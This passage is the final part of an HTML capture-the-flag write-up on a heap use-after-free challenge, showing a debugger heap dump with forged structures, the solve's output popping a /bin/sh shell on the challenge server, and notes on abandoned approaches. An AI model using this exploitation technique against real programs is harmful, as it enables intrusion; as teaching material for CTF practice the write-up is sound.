+<span class="hl_mark_a" id="hl_mark_a_33"><span>0x563307ebaa30</span></span><span class="term-fg34">	<span class="hl_mark_d hl_mark_d_33">0x0000000000000002	0x0000000000000002</span></span>	<span class="term-fg34">................</span>    (reference - word_t)
+0x563307ebaa40<span class="term-fg34">	<span class="hl_mark_d hl_mark_d_33">0x0000000000000000	0x00005632cbb2f41e</span></span>	<span class="term-fg34">............2V..</span>
+0x563307ebaa50<span class="term-fg34">	<span class="hl_mark_d hl_mark_d_33"><a href="#hl_mark_a_31"><span class="hl_mark_r hl_mark_r_31">0x0000563307eba9a0</span></a></span></span><span class="term-fg33">	0x0000000000000031</span>	<span class="term-fg33">....3V..1.......</span>
+<span class="hl_mark_a" id="hl_mark_a_37"><span>0x563307ebaa60</span></span><span class="term-fg33">	<span class="hl_mark_d hl_mark_d_37"><a href="#hl_mark_a_32"><span class="hl_mark_r hl_mark_r_32">0x0000563307eba980</span></a>	<a href="#hl_mark_a_33"><span class="hl_mark_r hl_mark_r_33">0x0000563307ebaa30</span></a></span></span>	<span class="term-fg33">....3V..0...3V..</span>    (reference - dict_t)
+0x563307ebaa70<span class="term-fg33">	<span class="hl_mark_d hl_mark_d_37"><a href="#hl_mark_a_34"><span class="hl_mark_r hl_mark_r_34">0x0000563307eba840</span></a>	0x0000000000000001</span></span>	<span class="term-fg33">@...3V..........</span>
+0x563307ebaa80<span class="term-fg33">	0x0000000000000000</span><span class="term-fg36">	0x0000000000000031</span>	<span class="term-fg36">........1.......</span>
+<span class="hl_mark_a" id="hl_mark_a_43"><span>0x563307ebaa90</span></span><span class="term-fg36">	<span class="hl_mark_d hl_mark_d_43"><a href="#hl_mark_a_35"><span class="hl_mark_r hl_mark_r_35">0x0000563307eba870</span></a>	<a href="#hl_mark_a_36"><span class="hl_mark_r hl_mark_r_36">0x0000563307ebab80</span></a></span></span>	<span class="term-fg36">p...3V......3V..</span>    (filler1 - dict_t)
+0x563307ebaaa0<span class="term-fg36">	<span class="hl_mark_d hl_mark_d_43"><a href="#hl_mark_a_37"><span class="hl_mark_r hl_mark_r_37">0x0000563307ebaa60</span></a>	0x0000000000000001</span></span>	<span class="term-fg36">`...3V..........</span>
+0x563307ebaab0<span class="term-fg36">	0x0000000000000000</span><span class="term-fg35">	0x0000000000000091</span>	<span class="term-fg35">................</span>
+<span class="hl_mark_a" id="hl_mark_a_40"><span>0x563307ebaac0</span></span><span class="term-fg35">	<span class="hl_mark_d hl_mark_d_40">0x0000563307eba2a0	0x0000000000000000</span></span>	<span class="term-fg35">....3V..........</span>    (filler1 - word_t** param)
+0x563307ebaad0<span class="term-fg35">	<span class="hl_mark_d hl_mark_d_40">0x0000000000000000	0x0000000000000000</span></span>	<span class="term-fg35">................</span>
+          ...
+0x563307ebab30<span class="term-fg35">	<span class="hl_mark_d hl_mark_d_40">0x0000000000000000	0x0000000000000000</span></span>	<span class="term-fg35">................</span>
+0x563307ebab40<span class="term-fg35">	<span class="hl_mark_d hl_mark_d_40">0x0000000000000000</span></span><span class="term-fg32">	0x0000000000000031</span>	<span class="term-fg32">........1.......</span>
+0x563307ebab50<span class="term-fg32">	<a href="#hl_mark_a_9"><span class="hl_mark_r hl_mark_r_9">0x0000563307eba890</span></a>	<a href="#hl_mark_a_38"><span class="hl_mark_r hl_mark_r_38">0x0000563307eba950</span></a></span>	<span class="term-fg32">....3V..P...3V..</span>    (sys_args - dict_t)
+0x563307ebab60<span class="term-fg32">	<a href="#hl_mark_a_39"><span class="hl_mark_r hl_mark_r_39">0x0000563307ebac90</span></a>	0x00005632cbb2f401</span>	<span class="term-fg32">....3V......2V..</span>
+0x563307ebab70<span class="term-fg32">	0x0000563307eba890</span><span class="term-fg34">	0x0000000000000031</span>	<span class="term-fg34">....3V..1.......</span>
+<span class="hl_mark_a" id="hl_mark_a_36"><span>0x563307ebab80</span></span><span class="term-fg34">	<span class="hl_mark_d hl_mark_d_36">0x0000000000000002	0x0000000000000001</span></span>	<span class="term-fg34">................</span>    (filler1 - word_t)
+0x563307ebab90<span class="term-fg34">	<span class="hl_mark_d hl_mark_d_36">0x0000000000000000	0x00005632cbb2f41e</span></span>	<span class="term-fg34">............2V..</span>
+0x563307ebaba0<span class="term-fg34">	<a href="#hl_mark_a_40"><span class="hl_mark_r hl_mark_r_40"><span class="hl_mark_d hl_mark_d_36">0x0000563307ebaac0</span></span></a></span><span class="term-fg33">	0x0000000000000021</span>	<span class="term-fg33">....3V..!.......</span>
+0x563307ebabb0<span class="term-fg33">	0x0000000563307eba	0xa071bf23daf5dc17</span>	<span class="term-fg33">.~0c........#.q.</span>  &lt;-- tcachebins[0x20][0/1]
+0x563307ebabc0<span class="term-fg33">	0x0000000000000000</span><span class="term-fg36">	0x0000000000000091</span>	<span class="term-fg36">................</span>
+<span class="hl_mark_a" id="hl_mark_a_41"><span>0x563307ebabd0</span></span><span class="term-fg36">	<span class="hl_mark_d hl_mark_d_41">0x0000563307eba2a0	0x0000000000000000</span></span>	<span class="term-fg36">....3V..........</span>    (fake_dosys_word - word_t** param)
+0x563307ebabe0<span class="term-fg36">	<span class="hl_mark_d hl_mark_d_41">0x0000000000000000	0x0000000000000000</span></span>	<span class="term-fg36">................</span>
+          ...
+0x563307ebac40<span class="term-fg36">	<span class="hl_mark_d hl_mark_d_41">0x0000000000000000	0x0000000000000000</span></span>	<span class="term-fg36">................</span>
+0x563307ebac50<span class="term-fg36">	<span class="hl_mark_d hl_mark_d_41">0x0000000000000000</span></span><span class="term-fg35">	0x0000000000000031</span>	<span class="term-fg35">........1.......</span>
+<span class="hl_mark_a" id="hl_mark_a_42"><span>0x563307ebac60</span></span><span class="term-fg35">	<span class="hl_mark_d hl_mark_d_42">0x0000000000000002	0x0000000000000001</span></span>	<span class="term-fg35">................</span>    (fake_dosys_word - word_t)
+0x563307ebac70<span class="term-fg35">	<span class="hl_mark_d hl_mark_d_42">0x0000000000000000	0x00005632cbb2f41e</span></span>	<span class="term-fg35">............2V..</span>
+0x563307ebac80<span class="term-fg35">	<span class="hl_mark_d hl_mark_d_42"><a href="#hl_mark_a_41"><span class="hl_mark_r hl_mark_r_41">0x0000563307ebabd0</span></a></span></span><span class="term-fg32">	0x0000000000000031</span>	<span class="term-fg32">....3V..1.......</span>
+<span class="hl_mark_a" id="hl_mark_a_39"><span>0x563307ebac90</span></span><span class="term-fg32">	<span class="hl_mark_d hl_mark_d_39"><a href="#hl_mark_a_8"><span class="hl_mark_r hl_mark_r_8">0x0000563307eba920</span></a>	</span><a href="#hl_mark_a_42"><span class="hl_mark_r hl_mark_r_42"><span class="hl_mark_d hl_mark_d_39">0x0000563307ebac60</span></span></a></span>	<span class="term-fg32"> ...3V..`...3V..</span>    (fake_dosys_word - dict_t)
+0x563307ebaca0<span class="term-fg32">	<a href="#hl_mark_a_43"><span class="hl_mark_r hl_mark_r_43"><span class="hl_mark_d hl_mark_d_39">0x0000563307ebaa90</span></span></a><span class="hl_mark_d hl_mark_d_39">	0x0000000000000001</span></span>	<span class="term-fg32">....3V..........</span>
+0x563307ebacb0<span class="term-fg32">	0x0000000000000000</span><span class="term-fg34">	0x0000000000000091</span>	<span class="term-fg34">................</span>
+<span class="hl_mark_a" id="hl_mark_a_30"><span>0x563307ebacc0</span></span><span class="term-fg34">	<span class="hl_mark_d hl_mark_d_30">0x0000563307eba2a0	0x0000000000000000</span></span>	<span class="term-fg34">....3V..........</span>    (sys_args - word_t** param)
+0x563307ebacd0<span class="term-fg34">	<span class="hl_mark_d hl_mark_d_30">0x0000000000000000	0x0000000000000000</span></span>	<span class="term-fg34">................</span>
+          ...
+0x563307ebad30<span class="term-fg34">	<span class="hl_mark_d hl_mark_d_30">0x0000000000000000	0x0000000000000000</span></span>	<span class="term-fg34">................</span>
+0x563307ebad40<span class="term-fg34">	<span class="hl_mark_d hl_mark_d_30">0x0000000000000000</span></span><span class="term-fg33">	0x00000000000202c1</span>	<span class="term-fg33">................</span>  &lt;-- Top chunk
+<span class="term-fg32 term-fg1">pwndbg&gt; </span>c
+Continuing.
+</pre>
+    <p>And that's the setup done! Calling <code>reference</code> in the interactive interpreter will call our forged word, which will now pop us a shell.</p>
+    <p>For reference, here's the solve in action:</p>
+    <pre class="term-container">spelling-bee $ .&#47;sol.py REMOTE
+[<span class="term-fg34 term-fg1">*</span>] &#39;&#47;home&#47;wherever&#47;it&#47;is&#47;spelling-bee&#47;chall_patched&#39;
+    Arch:       amd64-64-little
+    RELRO:      <span class="term-fg33">Partial RELRO</span>
+    Stack:      <span class="term-fg31">No canary found</span>
+    NX:         <span class="term-fg32">NX enabled</span>
+    PIE:        <span class="term-fg32">PIE enabled</span>
+    RUNPATH:    <span class="term-fg31">b&#39;.&#39;</span>
+    Stripped:   <span class="term-fg31">No</span>
+[<span class="term-fg34 term-fg1">*</span>] &#39;&#47;home&#47;wherever&#47;it&#47;is&#47;spelling-bee&#47;libc.so.6&#39;
+    Arch:       amd64-64-little
+    RELRO:      <span class="term-fg33">Partial RELRO</span>
+    Stack:      <span class="term-fg32">Canary found</span>
+    NX:         <span class="term-fg32">NX enabled</span>
+    PIE:        <span class="term-fg32">PIE enabled</span>
+[<span class="term-fg32 term-fg1">+</span>] Opening connection to spelling-bee.opus4-7.b01le.rs on port 8443: Done
+[<span class="term-fg34 term-fg1">*</span>] 0x5a9e75aab46b
+[<span class="term-fg34 term-fg1">*</span>] Switching to interactive mode
+defined a new word freed
+defined a new word reference
+defined a new word a_tcache_bin_filling_name
+forgot word freed
+forgot word a_tcache_bin_filling_name
+defined a new word filler1
+defined a new word filler2
+defined a new word AAAAAAAAAAAAAAAAAAAAAAAAk\xb4\xaau\x9eZ
+forgot word filler2
+defined a new word &#47;&#47;&#47;&#47;&#47;&#47;&#47;&#47;&#47;&#47;&#47;&#47;&#47;&#47;&#47;&#47;&#47;&#47;&#47;&#47;&#47;&#47;&#47;&#47;&#47;&#47;&#47;&#47;&#47;&#47;&#47;&#47;&#47;&#47;&#47;&#47;&#47;&#47;&#47;&#47;&#47;&#47;&#47;&#47;&#47;&#47;&#47;&#47;&#47;&#47;&#47;&#47;&#47;&#47;&#47;&#47;&#47;&#47;&#47;&#47;&#47;&#47;&#47;&#47;&#47;&#47;&#47;&#47;&#47;&#47;&#47;&#47;&#47;&#47;&#47;&#47;&#47;&#47;&#47;&#47;&#47;&#47;&#47;&#47;&#47;&#47;&#47;&#47;&#47;&#47;&#47;&#47;&#47;&#47;&#47;&#47;&#47;&#47;&#47;&#47;&#47;&#47;&#47;&#47;&#47;&#47;&#47;&#47;&#47;&#47;&#47;&#47;&#47;&#47;&#47;&#47;&#47;&#47;&#47;bin&#47;sh
+<span class="term-fg31 term-fg1">$</span> cat flag.txt
+bctf{1_h473_f0r63771n6_w0rd5_j5475v25fwpck}<span class="term-fg31 term-fg1">$</span>
+[<span class="term-fg34 term-fg1">*</span>] Closed connection to spelling-bee.opus4-7.b01le.rs port 8443
+spelling-bee $
+</pre>
+    <h2 id="#conclusion">Conclusion<div class=subtitle> but is it really?</div></h2>
+    <p>It had been a while since I had last solved a heap pwn, so a blatant UAF with relatively simple heap grooming was a nice return!</p>
+    <p>I say blatant now.</p>
+    <p>In reality, I did not solve this challenge during the ctf. I stared at everything in the code but completely missed the fact that words persist in references. I was so lost, that after the ctf had ended, I asked (:nauseated_face:) an AI (:face_vomiting:) for a hint. It was immediately obvious to me what the vulnerability was after likely about 10 tokens of output.</p>
+    <p>Tunnel vision set aside, this was a really fun challenge! I'd like to thank rebane2001 for inspiring the pwndbg hover effects, and the b01lersCTF orga for putting together an amazing CTF! We really enjoyed humanity-check :)</p>
+    <h2 id="appendix_a">Appendix A: Turn around while you can<div class="subtitle"> or: regex isn't the only one who should backtrack often</div></h2>
+    <aside>If you haven't yet, read the rest of the writeup, then continue here.</aside>
+    <p>Remember the part where we forgot <code>filler2</code> to replace the <code>system(val)</code> parameter? Well, my first idea was to replace the param pointer in the actual <code>word_t</code>, and point it to the data stack. Getting the address of the data stack was trivial; it is at a static offset from the leaked <code>do_sys</code>. Actually moving the params? Easier said than done.</p>
+    <p>Since the name gets copied with a <code>strcpy</code>, any null bytes we wish to send come only from the terminator, and everything after gets discarded.This meant that instead of sending the code and parameter at once, I had to do two name replacements.</p>
+    <p>More than two. The code pointer has two null bytes at the address (thus end of the string), so another name replacement in between the two was simply guranteeing that the last byte of the address was the null byte.</p>
+    <p>Getting <code>/bin/sh</code> onto the stack was <em>also</em> easier said than done. The stack is made up of 64-bit integers, but <code>accept_integer</code> returns an <code>int32</code>. I tried to get sneaky by chaining many <code>dup</code>s and <code>+</code>-es to assemble the upper- and lower 32 bits of the string, then add them together.</p>
+    <p>Failure as well. <code>+</code> also adds two 32-bit integers, but pushes that integer casted to 64 bits.</p>
+    <p>At any one of these points could I have realized there was a much easier way. I reached that realization at the last possible moment.</p>
+
+    <p>Thanks for reading!</p>
+    <footer>pingotux, 2026</footer>
+</body>
+</html>
